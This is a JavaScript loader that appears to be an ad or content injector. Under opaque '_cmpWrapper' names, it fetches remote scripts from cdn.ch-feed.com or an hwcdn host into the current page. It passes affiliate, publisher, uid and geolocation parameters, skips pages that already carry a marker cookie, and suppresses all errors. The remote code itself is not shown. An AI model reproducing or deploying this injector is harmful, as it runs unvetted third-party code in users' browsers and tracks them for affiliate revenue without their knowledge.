
(function() {
    try {

        function isie() {
            return /MSIE (\d+\.\d+);/.test(navigator.userAgent);
        }

        /* IE7 or lower */
        /*
        if(document.all && !document.querySelector) {
            return;
        }
        */

        /* IE7 or lower */
        if (isie() && (new Number(RegExp.$1)) < 8){
                return;
        }

        // if theres no "body" it stops the app
        if(!document.getElementsByTagName('body')[0]) {
            // no body on document
            return;
        }

        if(isie()) {
            try {
                if(document.documentMode < 7) {
                    return;
                }
                // if quirks mode it stop the app
                if(document.compatMode !== 'CSS1Compat') {
                    //TODO: report about this website
                    return;
                }
            }
            catch (e) {
                // quirks mode for IE
            }
        }


        if(document.cookie.indexOf('_cmpWrapper5c7a0161cdfa5091afb01ac1f2e34af5_init') != -1){
            try{console.log('********** display cookie found :',document.cookie); /** console.trace(); /**/ }catch(e){}
            return;
        }

        // creates window object
        window._cmpWrapper5c7a0161cdfa5091afb01ac1f2e34af5 = {};
        var prot;
        var base_url;
        if(window.location.protocol === 'https:') {
            prot = 'https://';
            base_url = prot + 'j6i7c9j2.ssl.hwcdn.net';
            window._cmpWrapper5c7a0161cdfa5091afb01ac1f2e34af5.secure = true;
        }
        else {
            prot = 'http://';
            base_url = prot + 'cdn.ch-feed.com';
            window._cmpWrapper5c7a0161cdfa5091afb01ac1f2e34af5.secure = false;
        }

        window._cmpWrapper5c7a0161cdfa5091afb01ac1f2e34af5.base_url = base_url;

        var lib_url = base_url + '/index/lib/875/lib.js?ver=875';
        var injector_identifier = 'a49409665be23309ca0720968e2388053';
        var injector_identifier_value = '46f7266c448a78a52fd538c534586f10';
        var loader_url = base_url + '?' + injector_identifier + '=' + injector_identifier_value;
        var injector_id = '_cmpWrapper68a78a9c56b0401b06224571c68cc940';
        var lib_script_id = injector_id + '_lib';
        var geo_url = base_url + '/index/geo/';
        var geo_url_id = injector_id + '_geo';

        // callback function from server with geo details
        window._cmpWrapper5c7a0161cdfa5091afb01ac1f2e34af5.resultFromGeo = function(data) {
            if(data.code) {
                getLibJson(loader_url, data.code);
            }
        }

        function getUrlVars(src) {
            var vars = [], hash;
            var hashes = src.slice(src.indexOf('?') + 1).split('&');
            for (var i = 0; i < hashes.length; i++) {
                hash = hashes[i].split('=');
                vars.push(hash[0]);
                vars[hash[0]] = hash[1];
            }
            return vars;
        }

        function addRemoteJS(url,id) {
            var tag = document.createElement('script');
            tag.setAttribute('type','text/javascript');
            tag.setAttribute('src',url);
            tag.id = id;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(tag);
            return tag;
        }

        function getSkin(src) {

            src = src || location.href;
            // here should be decided which skin to pick
            var vars = getUrlVars(src);
            return vars['skin'] ? vars['skin'] : '';
        }

        function getLibJson(loader_url, geo) {
            var scripts = document.getElementsByTagName('script');
            var slength = scripts.length;
            for (var i = 0; i < slength; i++) {
                if (scripts[i] && scripts[i].src) {
                    var src = scripts[i].src;
                    var urlVars = getUrlVars(src);

                    if(urlVars[injector_identifier]
                        && urlVars[injector_identifier] == injector_identifier_value) {



                        window._cmpWrapper5c7a0161cdfa5091afb01ac1f2e34af5.geo = (geo) ?  geo : (urlVars['geo']) ?  urlVars['geo'] : '';
                        window._cmpWrapper5c7a0161cdfa5091afb01ac1f2e34af5.suid = (urlVars['subid']) ? urlVars['subid'] : '';

                        var subid = (urlVars['subid']) ? '&subid=' + urlVars['subid'] : '';
                        var geo = (geo) ? '&geo=' + geo : (urlVars['geo']) ? '&geo=' + urlVars['geo'] : '';
                        var platform = (urlVars['platform']) ? '&platform=' + urlVars['platform'] : '';
                        var uid = (urlVars['uid']) ? '&uid=' + urlVars['uid'] : '';
                        var skin = '&skin=' + (urlVars['skin'] ?  urlVars['skin'] : getSkin()); //TODO: skin????
                        var affId = '&affId=' + (urlVars['affId'] ? urlVars['affId'] : 'gdAff42');
                        var pubId = '&pubId=' + (urlVars['pubId'] ? urlVars['pubId'] : 'gdPub42');



                        /***** REMOVE THIS ON PRODUCTION *****/
                        var vars123 = getUrlVars(location.href);
                        if(vars123['geo']) {
                            geo = '&geo=' + vars123['geo'];
                        }
                        /***** REMOVE THIS ON PRODUCTION *****/


                        // if we got geo from inject
                        if(geo != '') {
                            if(subid+geo)  {
                                lib_url =  lib_url + subid + geo;
                            }
                            addRemoteJS(lib_url + platform + uid + skin + affId + pubId, lib_script_id);
                            return;
                        }
                        else { // this is to get geo from server
                            addRemoteJS(geo_url, geo_url_id);
                            return;
                        }
                    }
                }
            }
        }

        // first call to bring library
        getLibJson(loader_url);

    } catch(e) {

    }
})();


